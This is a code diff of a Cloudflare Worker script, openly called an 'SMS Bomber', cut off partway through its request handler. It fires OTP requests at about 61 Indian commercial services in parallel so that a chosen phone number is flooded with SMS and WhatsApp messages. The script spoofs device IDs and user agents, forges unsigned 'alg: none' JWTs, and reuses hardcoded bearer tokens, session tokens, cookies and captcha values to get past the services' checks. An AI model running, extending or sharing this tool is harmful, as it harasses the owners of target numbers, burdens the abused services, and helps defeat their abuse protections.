@@ -1,8 +1,6 @@
-// ============================================================
-// SMS Bomber - Cloudflare Workers (ALL APIs)
-// File: src/index.js
-// Random jahan chal jaye, original jahan zaroori
-// ============================================================
+// ========================
+// Helper Functions
+// ========================
 
 function base64urlEncode(str) {
     return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
@@ -21,6 +19,7 @@ function randomAndroidId() {
         Math.floor(Math.random() * 0xffff).toString(16).padStart(4, '0')
     ).join('');
 }
+
 function randomDeviceId() { return randomAndroidId(); }
 
 function randomIP() {
@@ -42,6 +41,25 @@ function randomUserAgent() {
     return `Mozilla/5.0 (Linux; Android ${a}; ${m} Build/${b}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${c}.0.0.0 Mobile Safari/537.36`;
 }
 
+function generateAstroyogiToken() {
+    const header = JSON.stringify({ alg: 'none', typ: 'JWT' });
+    const payload = JSON.stringify({
+        UserType: 'TtaAppUser', EntityId: '29426901',
+        SourceUserType: 'TtaAppUser', SourceEntityId: '29426901',
+        nbf: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 7776000
+    });
+    return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
+}
+
+function generateAstroyogiWebToken() {
+    const header = JSON.stringify({ alg: 'none', typ: 'JWT' });
+    const payload = JSON.stringify({
+        UserType: 'WebUser', EntityId: '0', SourceUserType: '', SourceEntityId: '',
+        nbf: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 7776000
+    });
+    return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
+}
+
 function randomHex(len = 32) {
     let s = '';
     for (let i = 0; i < len; i++) s += Math.floor(Math.random() * 16).toString(16);
@@ -55,24 +73,6 @@ function randomAppVer() { return String(Math.floor(Math.random() * 100 + 500)); 
 function randomOS() { return String(Math.floor(Math.random() * 6 + 9)); }
 function randomBuild() { const b = ['RKQ1.211119.001','SP1A.210812.016','TP1A.220624.014','TQ3A.230901.001']; return b[Math.floor(Math.random() * b.length)]; }
 function randomDeviceModel() { const m = ['RMX3081','SM-G998B','Pixel 6','OnePlus 9','SM-A528B','M2012K11AG','SM-N986B','Redmi Note 10','SM-G991B','Pixel 5']; return m[Math.floor(Math.random() * m.length)]; }
-
-function generateAstroyogiToken() {
-    const header = JSON.stringify({ alg: 'none', typ: 'JWT' });
-    const payload = JSON.stringify({
-        UserType: 'TtaAppUser', EntityId: '29426901',
-        SourceUserType: 'TtaAppUser', SourceEntityId: '29426901',
-        nbf: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 7776000
-    });
-    return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
-}
-function generateAstroyogiWebToken() {
-    const header = JSON.stringify({ alg: 'none', typ: 'JWT' });
-    const payload = JSON.stringify({
-        UserType: 'WebUser', EntityId: '0', SourceUserType: '', SourceEntityId: '',
-        nbf: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 7776000
-    });
-    return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
-}
 
 function replacePlaceholders(str, mobile) {
     if (typeof str !== 'string') return str;
@@ -93,9 +93,9 @@ function replacePlaceholders(str, mobile) {
     return out;
 }
 
-// ============================================================
-// API CALL
-// ============================================================
+// ========================
+// API Call Function
+// ========================
 async function callAPI(url, method, headers, data = null, retries = 0) {
     let lastResult = null;
     for (let attempt = 0; attempt <= retries; attempt++) {
@@ -132,256 +132,204 @@ async function callAPI(url, method, headers, data = null, retries = 0) {
     return lastResult || { response: 'FAILED', httpcode: 0, success: false, time: 0 };
 }
 
-// ============================================================
-// ALL APIS (Random jahan chal jaye, original jahan zaroori)
-// ============================================================
+// ========================
+// ALL APIS (61 total)
+// ========================
 const APIS = [
-    // ========== RANDOM WALI (chal jati hain) ==========
+    // ========== RANDOM WALI ==========
 
-    // Nutrabay SMS
     { name: "Nutrabay SMS", url: "https://nutrabay.com/api/on-boarding/mobile-otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://nutrabay.com", "referer": "https://nutrabay.com/sale/nutrabay-sale/" },
       body: (m) => JSON.stringify({ mobile: m, c_code: "+91", otp_channel: 2, type: "login" }) },
 
-    // Nutrabay WhatsApp
     { name: "Nutrabay WhatsApp", url: "https://nutrabay.com/api/on-boarding/mobile-otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://nutrabay.com", "referer": "https://nutrabay.com/sale/nutrabay-sale/" },
       body: (m) => JSON.stringify({ mobile: m, c_code: "+91", otp_channel: 8, type: "login" }) },
 
-    // MuscleBlaze SMS
     { name: "MuscleBlaze SMS", url: "https://www.muscleblaze.com/veronica/user/validate/9/{no}/signup?plt=2&st=9", method: "GET",
       headers: { "referer": "https://www.muscleblaze.com/" }, body: null },
 
-    // MuscleBlaze WhatsApp
     { name: "MuscleBlaze WhatsApp", url: "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{no}/signup?plt=2&st=9", method: "GET",
       headers: { "referer": "https://www.muscleblaze.com/" }, body: null },
 
-    // GetVisitApp SMS
     { name: "GetVisitApp SMS", url: "https://api.getvisitapp.com/v3/new-auth/login-phone", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://web.getvisitapp.com", "referer": "https://web.getvisitapp.com/" },
       body: (m) => JSON.stringify({ phone: m, countryCode: 91, platform: "WEB", ssoInfo: null, storedUTMParams: {}, emailCode: "", evId: "" }) },
 
-    // GetVisitApp WhatsApp
     { name: "GetVisitApp WhatsApp", url: "https://api.getvisitapp.com/v3/new-auth/login-phone", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://web.getvisitapp.com", "referer": "https://web.getvisitapp.com/" },
       body: (m) => JSON.stringify({ channel: "whatsapp", resend: true, countryCode: 91, phone: m, platform: "WEB" }) },
 
-    // Landeed SMS
     { name: "Landeed SMS", url: "https://backend.landeed.com/api/v1/auth/browser_otp_login", method: "POST",
       headers: { "Content-Type": "application/json", "platform": "Web", "Origin": "https://web.landeed.com", "Referer": "https://web.landeed.com/" },
       body: (m) => JSON.stringify({ country_code: "+91", phone_number: m, delivery_method: "SMS", app_version: "0.75.0", binary_version: "0" }) },
 
-    // Landeed WhatsApp
     { name: "Landeed WhatsApp", url: "https://backend.landeed.com/api/v1/auth/browser_otp_login", method: "POST",
       headers: { "Content-Type": "application/json", "platform": "Web", "Origin": "https://web.landeed.com", "Referer": "https://web.landeed.com/" },
       body: (m) => JSON.stringify({ country_code: "+91", phone_number: m, delivery_method: "WHATSAPP", app_version: "0.75.0", binary_version: "0" }) },
 
-    // Redcliffe Labs
     { name: "Redcliffe Labs", url: "https://app.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://redcliffelabs.com", "referer": "https://redcliffelabs.com/" },
       body: (m) => JSON.stringify({ phone_number: m, short: true, country_code: "+91", medium: "" }) },
 
-    // Gritzo SMS
     { name: "Gritzo SMS", url: "https://www.gritzo.com/veronica/user/validate/187/{no}/signup?plt=2&st=187", method: "GET",
       headers: { "referer": "https://www.gritzo.com/" }, body: null },
 
-    // Gritzo WhatsApp
     { name: "Gritzo WhatsApp", url: "https://www.gritzo.com/veronica/user/validate/whatsapp/187/{no}/signup?plt=2&st=187", method: "GET",
       headers: { "referer": "https://www.gritzo.com/" }, body: null },
 
-    // HKVitals SMS
     { name: "HKVitals SMS", url: "https://www.hkvitals.com/veronica/user/validate/42/{no}/signup?plt=2&st=42", method: "GET",
       headers: { "referer": "https://www.hkvitals.com/" }, body: null },
 
-    // HKVitals WhatsApp
     { name: "HKVitals WhatsApp", url: "https://www.hkvitals.com/veronica/user/validate/whatsapp/42/{no}/signup?plt=2&st=42", method: "GET",
       headers: { "referer": "https://www.hkvitals.com/" }, body: null },
 
-    // TrueBasics SMS
     { name: "TrueBasics SMS", url: "https://www.truebasics.com/veronica/user/validate/26/{no}/signup?plt=2&st=26", method: "GET",
       headers: { "referer": "https://www.truebasics.com/" }, body: null },
 
-    // TrueBasics WhatsApp
     { name: "TrueBasics WhatsApp", url: "https://www.truebasics.com/veronica/user/validate/whatsapp/26/{no}/signup?plt=2&st=26", method: "GET",
       headers: { "referer": "https://www.truebasics.com/" }, body: null },
 
-    // HealthKart SMS
     { name: "HealthKart SMS", url: "https://www.healthkart.com/veronica/user/validate/1/{no}/signup?plt=2&st=1", method: "GET",
       headers: { "referer": "https://www.healthkart.com/" }, body: null },
 
-    // HealthKart WhatsApp
     { name: "HealthKart WhatsApp", url: "https://www.healthkart.com/veronica/user/validate/whatsapp/1/{no}/signup?plt=2&st=1", method: "GET",
       headers: { "referer": "https://www.healthkart.com/" }, body: null },
 
-    // Clinikally
     { name: "Clinikally", url: "https://api.clinikally.com/hodor/v1/auth/request_otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.clinikally.com", "referer": "https://www.clinikally.com/" },
       body: (m) => JSON.stringify({ mobile_number: "+91" + m }) },
 
-    // ShemarooMe
     { name: "ShemarooMe", url: "https://www.shemaroome.com/users/mobile_no_signup", method: "POST",
       headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.shemaroome.com", "referer": "https://www.shemaroome.com/users/sign_in" },
       body: (m) => `mobile_no=+91${m}&registration_source=organic` },
 
-    // GoldenBus
     { name: "GoldenBus", url: "https://m.goldenbus.in/user/sending-otp", method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://m.goldenbus.in", "Referer": "https://m.goldenbus.in/" },
       body: (m) => `mobileNumber=${m}&captacha=eWyHa` },
 
-    // IGP
     { name: "IGP", url: "https://www.igp.com/v2/loginSignup", method: "POST",
       headers: { "content-type": "application/json; charset=UTF-8", "origin": "https://www.igp.com", "referer": "https://www.igp.com/" },
       body: (m) => JSON.stringify({ email: "", mprefix: "91", mob: m, cid: "99", claimNumber: false, newUserFlag: false, verifyOtp: false, otp: "", isGuest: false, isInternational: false }) },
 
-    // Interflora
     { name: "Interflora", url: "https://www.interflora.in/v2/loginSignup", method: "POST",
       headers: { "content-type": "application/json; charset=UTF-8", "origin": "https://www.interflora.in", "referer": "https://www.interflora.in/" },
       body: (m) => JSON.stringify({ email: "", mprefix: "91", mob: m, cid: "99", claimNumber: false, newUserFlag: false, verifyOtp: false, otp: "", isGuest: false, isInternational: false }) },
 
-    // Slikk SMS
     { name: "Slikk SMS", url: "https://gateway.api.slikkclub.com/v1/auth/login", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.slikk.club", "referer": "https://www.slikk.club/" },
       body: (m) => JSON.stringify({ mobile: m, countryCode: "+91", deviceId: randomDeviceId(), otpType: "sms" }) },
 
-    // Slikk WhatsApp
     { name: "Slikk WhatsApp", url: "https://gateway.api.slikkclub.com/v1/auth/login", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.slikk.club", "referer": "https://www.slikk.club/" },
       body: (m) => JSON.stringify({ mobile: m, countryCode: "+91", deviceId: randomDeviceId(), otpType: "whatsapp" }) },
 
-    // HDFC Ergo SMS
     { name: "HDFC Ergo SMS", url: "https://here.co.in/users/v1/customer-portal/send-otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.hdfcergo.com", "referer": "https://www.hdfcergo.com/" },
       body: (m) => JSON.stringify({ mobile: m, countryCodeId: "b43569eb-6798-43fb-8d27-47d55d7c544b", source: "sms", encryptedMobileNumber: "952aeed881a78380d02e3e290c1cbe7f" }) },
 
-    // HDFC Ergo WhatsApp
     { name: "HDFC Ergo WhatsApp", url: "https://here.co.in/users/v1/customer-portal/send-otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.hdfcergo.com", "referer": "https://www.hdfcergo.com/" },
       body: (m) => JSON.stringify({ mobile: m, countryCodeId: "b43569eb-6798-43fb-8d27-47d55d7c544b", source: "whatsapp", encryptedMobileNumber: "952aeed881a78380d02e3e290c1cbe7f" }) },
 
-    // KPN Fresh
     { name: "KPN Fresh", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.kpnfresh.com", "referer": "https://www.kpnfresh.com/" },
       body: (m) => JSON.stringify({ phone_number: { number: m, country_code: "+91" } }) },
 
-    // Cuemath
     { name: "Cuemath", url: "https://leap.cuemath.com/api/v1/otp/phone/", method: "POST",
       headers: { "content-type": "application/JSON", "origin": "https://leap.cuemath.com", "referer": "https://leap.cuemath.com/login" },
       body: (m) => JSON.stringify({ phone: m, source: "login" }) },
 
-    // Atlys (naya)
     { name: "Atlys", url: "https://api.atlys.com/api/v1/auth/phone", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.atlys.com", "referer": "https://www.atlys.com/" },
       body: (m) => JSON.stringify({ iso2_code: "IN", phone: "+91" + m }) },
 
-    // BeBodywise
     { name: "BeBodywise", url: "https://api.bebodywise.com/portal/auth/send-otp?client=mobile-web", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://bebodywise.com", "referer": "https://bebodywise.com/", "brand": "BW" },
       body: (m) => JSON.stringify({ phoneNumber: m, source: "", resend: false }) },
 
-    // CityMall
     { name: "CityMall", url: "https://citymall.live/web-api/auth/send-otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://citymall.live", "referer": "https://citymall.live/" },
       body: (m) => JSON.stringify({ phone_number: m }) },
 
-    // SatvaCart
     { name: "SatvaCart", url: "https://oms.satvacart.com/customer/auth/send_otp/", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.satvacart.com", "referer": "https://www.satvacart.com/" },
       body: (m) => JSON.stringify({ phone_number: m }) },
 
-    // Auricle
     { name: "Auricle", url: "https://auricle.co.in/mobile-verify", method: "POST",
       headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://auricle.co.in", "referer": "https://auricle.co.in/login", "x-csrf-token": randomHex(32) },
       body: (m) => `mobile=+91${m}&device_id=Mozilla/5.0+(Linux;+Android+10;+K)+AppleWebKit/537.36` },
 
-    // DoctorC
     { name: "DoctorC", url: "https://doctorc.in/api/otp/", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://doctorc.in", "referer": "https://doctorc.in/login/", "x-csrftoken": randomHex(32) },
       body: (m) => JSON.stringify({ phone_number: m, should_resend: false }) },
 
-    // Licious
     { name: "Licious", url: "https://www.licious.in/api/login/signup", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.licious.in", "referer": "https://www.licious.in/profile" },
       body: (m) => JSON.stringify({ phone: m, captcha_token: "" }) },
 
-    // CityFurnish SMS
     { name: "CityFurnish SMS", url: "https://api.cityfurnish.com/api/user/sendOtpV2", method: "POST",
       headers: { "Content-Type": "application/json", "Origin": "https://cityfurnish.com", "Referer": "https://cityfurnish.com/" },
       body: (m) => JSON.stringify({ mobileNumber: m }) },
 
-    // CityFurnish WhatsApp
     { name: "CityFurnish WhatsApp", url: "https://api.cityfurnish.com/api/user/sendOtpV2", method: "POST",
       headers: { "Content-Type": "application/json", "Origin": "https://cityfurnish.com", "Referer": "https://cityfurnish.com/" },
       body: (m) => JSON.stringify({ mobileNumber: m, channel: "whatsapp" }) },
 
-    // OneWay Send OTP
     { name: "OneWay Send OTP", url: "https://oneway.cab/api/auth/send-otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://oneway.cab", "referer": "https://oneway.cab/" },
       body: (m) => JSON.stringify({ mobileNo: m, passengerName: "Black", email: "", fromCity: "", toCity: "" }) },
 
-    // OneWay Resend OTP
     { name: "OneWay Resend OTP", url: "https://oneway.cab/api/auth/resend-otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://oneway.cab", "referer": "https://oneway.cab/" },
       body: (m) => JSON.stringify({ mobileNo: m }) },
 
-    // WeCredit
     { name: "WeCredit", url: "https://wecredit.co.in/api/auth", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://wecredit.co.in", "referer": "https://wecredit.co.in/" },
       body: (m) => JSON.stringify({ mobile: m, endpoint: "login", lenderName: "WC001" }) },
 
-    // eBullion
     { name: "eBullion", url: "https://api.ebullion.in/login/send/otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://secure.ebullion.in", "referer": "https://secure.ebullion.in/", "authorization": "Bearer null" },
       body: (m) => JSON.stringify({ mobile: "+91" + m, partnerId: "1" }) },
 
-    // CureBay
     { name: "CureBay", url: "https://meds-gateway-api.curebay.com/api-gateway/authenticate/sendOtp?mobileNo={no}", method: "POST",
       headers: { "origin": "https://meds.curebay.com", "referer": "https://meds.curebay.com/" }, body: null },
 
-    // HyperPure
     { name: "HyperPure", url: "https://api.hyperpure.com/api/verifyUser?phoneNumber={no}", method: "GET",
       headers: { "origin": "https://www.hyperpure.com", "referer": "https://www.hyperpure.com/" }, body: null },
 
-    // ManMatters
     { name: "ManMatters", url: "https://api.manmatters.com/portal/auth/send-otp?client=mobile-web", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://manmatters.com", "referer": "https://manmatters.com/", "brand": "MM" },
       body: (m) => JSON.stringify({ phoneNumber: m, resend: true, source: "" }) },
 
-    // IndMoney
     { name: "IndMoney", url: "https://apixt-iw.indmoney.com/indshield/public/ext/v4/otp/generate", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.indmoney.com", "referer": "https://www.indmoney.com/" },
       body: (m) => JSON.stringify({ countryCode: "+91", mobile: m, identity_token: "" }) },
 
-    // PocketFM
     { name: "PocketFM", url: "https://pocketfm.com/login", method: "POST",
       headers: { "content-type": "text/plain;charset=UTF-8", "origin": "https://pocketfm.com" },
       body: (m) => JSON.stringify([{ phone_number: "+91" + m, country_code: "+91" }]) },
 
-    // Refyne
     { name: "Refyne", url: "https://prod-api.refyne.co.in/auth/v3/send-otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://app.refyne.co.in", "referer": "https://app.refyne.co.in/" },
       body: (m) => JSON.stringify({ channel: "SMS", recipient: m }) },
 
-    // RailRestro
     { name: "RailRestro", url: "https://www.railrestro.com/auth/request", method: "POST",
       headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.railrestro.com", "referer": "https://www.railrestro.com/login" },
       body: (m) => `_token=${randomHex(40)}&username=${m}&remember=` },
 
-    // InstaAstro
     { name: "InstaAstro", url: "https://instaastro.com/v1/users/website-phone-login/login/new/", method: "POST",
       headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://instaastro.com", "referer": "https://instaastro.com/" },
       body: (m) => `phone_number=+91${m}&dynamic_api_key=aW5zdGEyMDIzd2Vi&csrfmiddlewaretoken=${randomHex(64)}&g_recaptcha=` },
 
-    // Riggle
     { name: "Riggle", url: "https://api.riggleapp.in/api/v1/user/auth/send_otp/", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://app.riggleapp.in", "referer": "https://app.riggleapp.in/", "x-app-name": "plug" },
       body: (m) => JSON.stringify({ mobile: m, agreement: true }) },
 
-    // Call Astro
     { name: "Call Astro", url: "https://www.call-astro.com/user/userlogin", method: "POST",
       headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.call-astro.com", "referer": "https://www.call-astro.com/user/login" },
       body: (m) => `method=whatsapp&mobile=${m}&country=+91-10&_token=${randomHex(40)}` },
 
-    // Jugnoo OTP
     { name: "Jugnoo OTP", url: "https://prod-autos-api.jugnoo.in/v4/customer/generate_login_otp", method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "okhttp/5.0.0-alpha.2" },
       body: (m) => new URLSearchParams({
@@ -395,39 +343,32 @@ const APIS = [
           unique_device_id: randomDeviceId(), longitude: randomLng(), last_push_time_diff: "-1"
       }).toString() },
 
-    // PolicyX
     { name: "PolicyX", url: "https://www.policyx.com/user_login/customer-login-webservice.php", method: "POST",
       headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.policyx.com", "referer": "https://www.policyx.com/customer-login/" },
       body: (m) => `PhoneNumber=${m}&captcha=5m5hg4&action=validate_captcha&_pxtoken=c44a4eab406fe8ab47ae5b14ea04fa36` },
 
-    // Rupee112
     { name: "Rupee112", url: "https://www.rupee112.com/login-sbm", method: "POST",
       headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.rupee112.com", "referer": "https://www.rupee112.com/apply-now" },
       body: (m) => `mobile=${m}&current_page=login&is_existing_customer=2&device_id=${randomDeviceId()}&captcha=iudoF&require_captcha=1&tnc=true` },
 
-    // TheSouledStore
     { name: "TheSouledStore", url: "https://api.thesouledstore.com/api/v2/register-otp?platform=web", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.thesouledstore.com", "referer": "https://www.thesouledstore.com/" },
       body: (m) => JSON.stringify({ firstname: "Black ", lastname: "Devil ", email: "test" + Date.now() + "@test.com", password: "998877", cpassword: "998877", telephone: m, birthdate: "2000-01-03", gender: "M", token: "" }) },
 
-    // Airpaz
     { name: "Airpaz", url: "https://next-api.airpaz.com/v2/member/login-request", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.airpaz.com", "referer": "https://www.airpaz.com/", "x-country": "IN" },
       body: (m) => JSON.stringify({ mobileCode: "IN", mobile: m, lang: "en", channel: "wa" }) },
 
-    // Zynerd
     { name: "Zynerd", url: "https://infra.zynerd.com/api_v3/auth/send_otp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.zynerd.com", "referer": "https://www.zynerd.com/" },
       body: (m) => JSON.stringify({ phone_no: "+91-" + m, medium: "SMS" }) },
 
-    // Prestige
     { name: "Prestige", url: "https://www.prestigeconstructions.com/api/apicall", method: "POST",
       headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.prestigeconstructions.com", "referer": "https://www.prestigeconstructions.com/upcoming-projects" },
       body: (m) => `dynamicurl=employee/v2/customersendotp&Mobile_No=${m}&Mobile_CountryCode=+91&whatsapp_nri=0` },
 
-    // ========== ORIGINAL WALI (random se fail hoti hain) ==========
+    // ========== ORIGINAL WALI ==========
 
-    // Zostel — client-key/device-id/secret fixed
     { name: "Zostel", url: "https://api.io.zo.xyz/api/v1/auth/login/mobile/otp/", method: "POST",
       headers: { "host": "api.io.zo.xyz", "content-type": "application/json",
         "client-device-secret": "MTc5MTY0MjY1NzIzMjA1MDEwNTM3MzYxNDgwMDA1MzczNjgwMDM2MDI0NjQ0Mjg1djhhaG1qZ2swb2g=",
@@ -436,72 +377,63 @@ const APIS = [
         "origin": "https://www.zostel.com", "referer": "https://www.zostel.com/" },
       body: (m) => JSON.stringify({ mobile_number: m, mobile_country_code: "91", captcha_response_token: "" }) },
 
-    // Vetic SMS — hardcoded Bearer token
     { name: "Vetic SMS", url: "https://org.vetic.in/iam-service/iam/web/send-otp/", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://vetic.in", "referer": "https://vetic.in/",
         "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3OTE2NDI3OTcsImV4cCI6MTc5MTY0NjM5Nywic3ViIjp7Imd1ZXN0X3VzZXJfaWQiOiI2MzQ4MWE1Ny05MDcxLTRmYzEtOTM5MS00ZjBkOTIzOWJkZjAifX0.QKXX3_wy5snrcaj7QkJDnFP91gx7GIchXeLY9DcKaOw" },
       body: (m) => JSON.stringify({ mobile: m, name: "Devil ", fcm_registration_id: "", is_physical_device: false, device_os: "android", device_os_version: "15", device_model: "RE58A5L1", device_brand: "realme", device_id: "2410e73a-08e8-4f97-963e-075e1c7f22fa", advertising_id: "", app_version: "3.9.5", app_build_number: "145", source_id: "1", whatsapp_otp_request: false, utm_source: "web-app", utm_content: "web-app", referer_url: "https://vetic.in/", traffic_source: "web-app" }) },
 
-    // Vetic WhatsApp — same token
     { name: "Vetic WhatsApp", url: "https://org.vetic.in/iam-service/iam/web/send-otp/", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://vetic.in", "referer": "https://vetic.in/",
         "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3OTE2NDI3OTcsImV4cCI6MTc5MTY0NjM5Nywic3ViIjp7Imd1ZXN0X3VzZXJfaWQiOiI2MzQ4MWE1Ny05MDcxLTRmYzEtOTM5MS00ZjBkOTIzOWJkZjAifX0.QKXX3_wy5snrcaj7QkJDnFP91gx7GIchXeLY9DcKaOw" },
       body: (m) => JSON.stringify({ mobile: m, name: "Devil ", fcm_registration_id: "", is_physical_device: false, device_os: "android", device_os_version: "15", device_model: "RE58A5L1", device_brand: "realme", device_id: "2410e73a-08e8-4f97-963e-075e1c7f22fa", advertising_id: "", app_version: "3.9.5", app_build_number: "145", source_id: "1", whatsapp_otp_request: true, utm_source: "web-app", utm_content: "web-app", referer_url: "https://vetic.in/", traffic_source: "web-app" }) },
 
-    // Lenskart — x-session-token fixed
     { name: "Lenskart", url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", method: "POST",
       headers: { "content-type": "application/json", "origin": "https://www.lenskart.com", "referer": "https://www.lenskart.com/",
         "x-country-code": "IN", "x-session-token": "60418799-09fc-43a2-a429-b8fdf0880d19", "x-api-client": "mobilesite", "x-customer-type": "NEW" },
       body: (m) => JSON.stringify({ captcha: null, phoneCode: "+91", telephone: m }) },
 
-    // LegalKart WhatsApp — x-portal fixed
     { name: "LegalKart WhatsApp", url: "https://lkapi.legalkart.com/api/v1/auth/login/send-otp", method: "POST",
       headers: { "host": "lkapi.legalkart.com", "content-type": "application/json",
         "x-portal": "LAWYER", "origin": "https://lawyers.legalkart.com", "referer": "https://lawyers.legalkart.com/" },
       body: (m) => JSON.stringify({ mobile: m, dialingCode: "91", otpChannel: "WHATSAPP" }) },
 
-    // LegalKart SMS
     { name: "LegalKart SMS", url: "https://lkapi.legalkart.com/api/v1/auth/login/send-otp", method: "POST",
       headers: { "host": "lkapi.legalkart.com", "content-type": "application/json",
         "x-portal": "LAWYER", "origin": "https://lawyers.legalkart.com", "referer": "https://lawyers.legalkart.com/" },
       body: (m) => JSON.stringify({ mobile: m, dialingCode: "91", otpChannel: "SMS" }) },
 
-    // BlueStone — isSignUp fixed, cookie fixed
     { name: "BlueStone", url: "https://www.bluestone.com/generate-and-send-otp", method: "POST",
       headers: { "host": "www.bluestone.com", "content-type": "application/x-www-form-urlencoded",
         "origin": "https://www.bluestone.com", "referer": "https://www.bluestone.com/",
         "cookie": "JSESSIONID=00065F18AF2677F00FC0E8F894083479; pincode=110001; obref=2649569d-0040-4bb6-b039-6d9f3370b448; kp_user_id=019e9374-e36e-7c76-b2a9-6d81c17ca190; shopflo_session_id=b0a31e00-b3fd-4f6f-bdcf-f08bba311e94" },
       body: (m) => `contactNumberOrEmail=${m}&isSignUp=true` },
 
-    // Astroyogi App — JWT token generated
     { name: "Astroyogi App", url: "https://api.astroyogi.com/api/v3/user/sendOtp", method: "POST",
       headers: { "Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer {astroyogi_token}",
         "User-Agent": "okhttp/4.9.0", "Accept": "application/json" },
       body: (m) => JSON.stringify({ country_code: "+91", mobile: m, device_id: randomDeviceId(), device_model: randomDeviceModel(), os_version: randomOS(), build_number: randomBuild() }) },
 
-    // Astroyogi Web
     { name: "Astroyogi Web", url: "https://www.astroyogi.com/api/v3/user/sendOtp", method: "POST",
       headers: { "Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer {astroyogi_web_token}",
         "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
         "Accept": "application/json, text/plain, */*", "Origin": "https://www.astroyogi.com", "Referer": "https://www.astroyogi.com/" },
       body: (m) => JSON.stringify({ country_code: "+91", mobile: m, source: "web" }) },
 
-    // GetZype — hashKey required
     { name: "GetZype", url: "https://stage-api-gateway.getzype.com/auth/signinup/code", method: "POST",
       headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
       body: (m) => JSON.stringify({ hashKey: "", phoneNumber: "+91" + m }) }
 ];
 
-// ============================================================
-// EXECUTE ALL (parallel, 50 subrequest limit ke andar)
-// ============================================================
+// ========================
+// Execute All APIs
+// ========================
 async function executeAll(mobile) {
     const results = [];
     let successful = 0, failed = 0;
     const startTime = Date.now();
 
     const shuffled = APIS.slice().sort(() => Math.random() - 0.5);
-    const CONCURRENCY = 10; // safe parallel
+    const CONCURRENCY = 10;
     const batches = [];
     for (let i = 0; i < shuffled.length; i += CONCURRENCY) {
         batches.push(shuffled.slice(i, i + CONCURRENCY));
@@ -534,13 +466,13 @@ async function executeAll(mobile) {
     return { results, successful, failed, totalTime: ((Date.now() - startTime) / 1000).toFixed(2) };
 }
 
-// ============================================================
-// CLOUDFLARE WORKERS ENTRY POINT
-// ============================================================
+// ========================
+// Cloudflare Worker Handler
+// ========================
 export default {
     async fetch(request, env, ctx) {
         const url = new URL(request.url);
-        const mobile = (url.searchParams.get('mobile') || '').replace(/[^0-9]/g, '');
+        const mobile = url.searchParams.get('mobile');
 
         const corsHeaders = {
             'Access-Control-Allow-Origin': '*',
@@ -550,65 +482,61 @@ export default {
 
         if (request.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });
 
-        if (mobile && mobile.length === 10) {
-            try {
-                const data = await executeAll(mobile);
-                return new Response(JSON.stringify({
-                    success: true,
-                    message: `SMS Bombing completed on ${mobile}`,
-                    total_apis: data.results.length,
-                    success_count: data.successful,
-                    failed_count: data.failed,
-                    total_time: data.totalTime + 's',
-                    results: data.results
-                }, null, 2), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
-            } catch (err) {
